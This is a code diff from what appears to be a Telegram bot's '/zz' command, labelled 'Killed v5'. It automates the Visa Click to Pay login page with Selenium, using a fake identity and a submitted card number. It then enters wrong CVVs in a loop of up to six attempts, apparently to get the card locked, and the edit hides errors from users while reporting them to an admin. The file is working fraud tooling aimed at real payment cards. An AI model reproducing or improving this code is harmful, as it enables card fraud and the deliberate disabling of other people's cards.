@@ -5458,9 +5458,9 @@ async def ko_cmd(update, context):
     }
     Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.5 /zz Command (Killed v5 — FAST MODE UPDATED) ==== #
+# ==== 7.5 /zz Command (Killed v5 — FINAL CLEAN ERROR VERSION) ==== #
 def run_zz_process(card_input, update_dict):
-    """Killed v5 Fast - UPDATED FLOW + MAX SPEED"""
+    """Killed v5 Fast - FINAL (CLEAN USER ERROR + ADMIN TRACE)"""
     import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5474,12 +5474,12 @@ def run_zz_process(card_input, update_dict):
         killer_edit_message(update_dict, "⚙️ Processing your request...")
 
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 3)  # ⚡ keep zz fastest
+        wait = WebDriverWait(driver, 3)
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # ✅ COOKIE FIX
+        # COOKIE
         # ================================
         try:
             btn = WebDriverWait(driver, 5).until(
@@ -5490,7 +5490,7 @@ def run_zz_process(card_input, update_dict):
             pass
 
         # ================================
-        # STEP 1 — LOGIN (UPDATED)
+        # STEP 1 — LOGIN
         # ================================
         identity = killer_get_fake_identity()
 
@@ -5510,7 +5510,7 @@ def run_zz_process(card_input, update_dict):
             wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Next']]"))))
 
         # ================================
-        # STEP 2 — CARD (UPDATED ORDER)
+        # STEP 2 — CARD
         # ================================
         cc, mm, yy, real_cvv = killer_split_card(card_input)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
@@ -5529,7 +5529,7 @@ def run_zz_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
         # ================================
-        # STEP 3 — ADDRESS (UPDATED)
+        # STEP 3 — ADDRESS
         # ================================
         try:
             country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
@@ -5547,18 +5547,17 @@ def run_zz_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # 🔥 UPDATED BUTTON (NEW FLOW)
         add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
         driver.execute_script("arguments[0].click();", add_btn)
 
         killer_edit_message(update_dict, "🔄 Updating your request...")
 
         # ================================
-        # STEP 4 — CVV LOOP (ZZ STYLE FAST)
+        # STEP 4 — CVV LOOP (FAST)
         # ================================
         used_cvvs = {wrong_cvv}
 
-        for _ in range(5):  # total 6 tries
+        for _ in range(5):
             fake_cvv = killer_get_wrong_cvv(real_cvv)
             while fake_cvv in used_cvvs:
                 fake_cvv = killer_get_wrong_cvv(real_cvv)
@@ -5570,7 +5569,6 @@ def run_zz_process(card_input, update_dict):
                 cvv_field.send_keys(Keys.CONTROL + "a")
                 cvv_field.send_keys(fake_cvv)
 
-                # ✅ CLICK AFTER FILL (UPDATED)
                 add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
                 driver.execute_script("arguments[0].click();", add_btn)
 
@@ -5592,8 +5590,13 @@ def run_zz_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        killer_edit_message(update_dict, f"❌ ZZ Error: `{e}`")
+
+        # ✅ USER CLEAN MESSAGE
+        killer_edit_message(update_dict, "❌ Request timeout, try again.")
+
+        # ✅ ADMIN FULL ERROR (already working)
         killer_admin_report("zz", trace, driver)
+
         record_cmd_failure("zz")
 
     finally:
